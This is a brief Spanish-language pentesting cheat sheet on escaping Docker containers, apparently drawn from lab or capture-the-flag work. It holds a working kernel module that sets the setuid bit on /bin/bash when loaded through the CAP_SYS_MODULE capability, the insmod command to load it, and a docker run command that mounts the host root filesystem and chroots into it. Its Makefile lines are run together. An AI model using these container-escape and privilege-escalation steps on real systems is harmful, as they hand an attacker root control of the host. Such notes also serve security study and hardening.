# docker-breakout

# Docker breakout

## Enumeración con CDK

```
root@a2d8c468a7c2:/tmp# ./cdk  eva --full
```

## Abuso de Capabilities

### CAP_SYS_MODULE

Es necesario crear un script en c para compilarlo y ejecutar comandos

- shell.c

```
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","chmod u+s /bin/bash", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

- Makefile

```makefile
obj-m +=reverse-shell.oall:    make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) modulesclean:    make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) clean
```

### Explotación

```
root@a2d8c468a7c2:/tmp# insmod reverse-shell.ko
```

## Creación de contenedor con montura desde la raíz

```
spanishdancer@ariekei:/opt/docker$ docker images
spanishdancer@ariekei:/opt/docker$ docker run -it -v /:/host/ waf-template chroot /host/ bash
```